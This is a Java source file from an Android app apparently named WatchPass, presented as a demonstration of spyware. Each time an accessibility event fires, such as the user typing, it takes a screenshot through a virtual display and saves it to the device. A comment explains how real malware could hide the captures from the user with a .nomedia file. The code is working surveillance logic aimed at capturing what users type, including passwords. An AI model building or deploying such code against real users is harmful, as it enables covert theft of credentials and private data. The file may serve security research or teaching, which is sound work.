package com.stevenbenack.watchpass;

import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.media.Image;
import android.media.ImageReader;
import android.os.Environment;
import android.util.Log;
import android.view.Display;
import android.view.Surface;

import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;

/**
 * Image read listener class that listens for when an image is ready to screenshotted. This is listening from the
 * VirtualScreenCaptureService class for when the virtual display service is available for us to take a screenshot.
 * This class also listens for when the accessibility class has an event (i.e. when the user types or does any other
 * action we declared in the accessibility service). When the listener sees a image is available and a accessibility
 * event occurs, take a screenshot and save it
 */
public class ImageReadManagerListener implements ImageReader.OnImageAvailableListener {
    private static final String TAG = "ImageReadListener";

    public int width;
    public int height;
    private final ImageReader imageReader;
    private Bitmap latestBitmap;
    private boolean onDidUserEvent;

    /*
     * Declaration of ImageReadManagerListener for VirtualScreenCaptureService to declare
     * We need to grab all the screen information for the virtual display
     */
    public ImageReadManagerListener(VirtualScreenCaptureService virtualScreenCaptureService) {
        this.latestBitmap = null;
        this.onDidUserEvent = false;
        Display display=virtualScreenCaptureService.getWindowManager().getDefaultDisplay();
        Point size = new Point();

        display.getSize(size);

        this.width = size.x;
        this.height = size.y;

        // Want to limit our image to 2.2MP because without this, my phone fills up with unnecessarily large images
        while ( (width * height) > 2210760) {
            this.width /= 2;
            this.height /= 2;
        }

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 8);
        imageReader.setOnImageAvailableListener(this, virtualScreenCaptureService.getHandler());

        EventBus.getDefault().register(this);
    }

    /*
     * Main listener class for when an image available for us to screenshot. On image available, we check if the an
     * accessibility event occurs at the same time, if so, take a screenshot.
     */
    @Override
    public void onImageAvailable(ImageReader reader) {
        /* Grab the latest image from the image reader that is a part of the class - this reader is a object that is a
         * property of the virtual display from VirtualScreenCaptureService
        */
        Image image = imageReader.acquireLatestImage();

        // If image available isn't null and an Accessibility event occurs, take a screenshot
        if ( image != null && onDidUserEvent ) {
            // a bunch of formatting for the screenshot so it screenshots correctly from the image buffer bitmap
            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * width;
            int bitmapWidth = width + rowPadding / pixelStride;

            if (latestBitmap == null || latestBitmap.getWidth() != bitmapWidth || latestBitmap.getHeight() != height) {
                if (latestBitmap != null) {
                    latestBitmap.recycle();
                }
                latestBitmap = Bitmap.createBitmap(bitmapWidth, height, Bitmap.Config.ARGB_8888);
            }
            latestBitmap.copyPixelsFromBuffer(buffer);

            /* once we get the image information we need from the above, we need to close the image (so we can take
             * another screenshot immediately without missing any)
             * Also set onDidUserEvent to false because we've just dealt with the accessibility event
             */
            image.close();
            onDidUserEvent = false;


            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            Bitmap croppedOutputStream = Bitmap.createBitmap(latestBitmap, 0, 0, width, height);

            croppedOutputStream.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream);

            byte[] newPng = byteArrayOutputStream.toByteArray();

            Log.d(TAG, "New Screen capture");
            savePhoto(newPng);
        }
        /* if onDidUserEvent is false (no accessibility event at the moment), then just close the image to wait for the
         * next available image
        */
        else if( image != null ) {
            image.close();
        }
    }

    /*
     * Event listener to listen for when the user starts typing. Event notification comes from AccessibilityService.
     * On notification of the user clicking on something, set onDidUserEvent to true to know to take the next available
     * screenshot in the onImageAvailable function
     */
    @Subscribe(threadMode = ThreadMode.BACKGROUND)
    public void onMessageEvent(UserEvents.UserAccessibilityEvent event) {
        /* Do something */
        Log.d(TAG, "ACCESSIBILITY EVENT HERE");
        this.onDidUserEvent = true;
    }

    // Get the surface screen from the image reader
    public Surface getSurface() {
        return(imageReader.getSurface());
    }

    /*
     * Method takes a screenshot of the current screen (in this case, an invisible screen drawn over whatever the user
     * is currently doing. The method then saves the screenshot to the device.
     * If this were actually malware, you could set the app to save the photo to a hidden folder on their device
     * such that the user would not be able to see that this app is even saving anything. This would be done by adding
     * a "./nomedia" file to the create folder. I did not do that in this app while I was working for obvious reasons
     */
    private void savePhoto(byte[] newPng) {
        File directory = new File(Environment.getExternalStorageDirectory() + "/Download/WatchPass/");
        if ( !directory.exists() || !directory.isDirectory() ) {
            directory.mkdirs();
        }

        Long tsLong = System.currentTimeMillis()/1000;
        String ts = tsLong.toString();
        File myPath = new File(directory, "WatchPassScreenshot" + ts + ".jpg");
        Log.d(TAG, "photo path: " + myPath);
        FileOutputStream fos = null;

        try {
            fos = new FileOutputStream(myPath);
            fos.write(newPng);
            fos.flush();
            fos.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
